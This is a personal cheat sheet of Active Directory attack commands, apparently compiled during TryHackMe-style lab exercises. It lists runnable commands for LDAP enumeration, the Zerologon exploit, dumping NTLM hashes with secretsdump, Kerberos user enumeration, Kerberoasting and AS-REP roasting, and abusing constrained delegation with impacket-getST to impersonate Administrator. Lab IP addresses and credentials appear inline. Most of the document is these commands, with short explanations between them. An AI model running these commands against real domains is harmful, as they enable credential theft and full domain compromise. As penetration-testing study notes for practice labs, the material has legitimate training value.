# AD Notes
`nmap -n -sV --script "ldap* and not brute" -p 389 10.10.170.157` for finding NetBIOS name of the Domain Controller,

NetBIOS domain name of the network, etc.,

`python3 zerologon.py <dc-name> <dc-ip>`

`python3 secretsdump.py -just-dc -no-pass DC01\$@10.10.170.157` to dump ntlm hashes of the system

`./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`  
 for username enumeration

`` `Rubeus.exe harvest /interval:30` ``  hash dump when you're already in

for kerberoasting/find users hashes use:

```text-plain
python3 GetUserSPNs.py COOCTUS.CORP/Visitor:GuestLogin! -dc-ip 10.10.15.138 -request
```

if you get the error, `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` when running this, it's because of your local time, you need to synchronize the host with the DC: `ntpdate 10.10.15.138`

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.

```text-plain
python3 GetNPUsers.py windcorp.thm/ -no-pass -usersfile ../../../windcorp/valid_users.txt
```

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py.

**Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....**

**The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes.**

![](AD%20Notes/c9113ad0ff443dd0973736552e85aa.jpg)

Kerberos Delegation:
--------------------

The following is a description of the risk posed by different delegation types:

*   **Unconstrained delegation**: Any service can be abused if one of their delegation entries is sensitive.
*   **Constrained delegation**: Constrained entities can be abused if one of their delegation entries is sensitive.
*   **Resource-based constrained delegation (RBCD)**: Resource-based constrained entities can be abused if the entity itself is sensitive.

`'TRUSTED_TO_AUTH_FOR_DELEGATION!'` set which confirms our contrained delegation theory.

Using the impacket's find delegation to extract more information about the delegation.

```text-plain
impacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.15.138
```

Using the impacket's getST script to impersonate and get the ticket of the Administrator user.  
If the account is configured with constrained delegation (with protocol transition), we can request service tickets for other users, assuming the target SPN is allowed for delegation

```text-plain
impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.10.15.138
```

Once we have the ccache file, set it to the KRB5CCNAME variable so that it is loaded inside the memory and then we can use it to our advantage.

```text-plain
export KRB5CCNAME=Administrator.ccache
```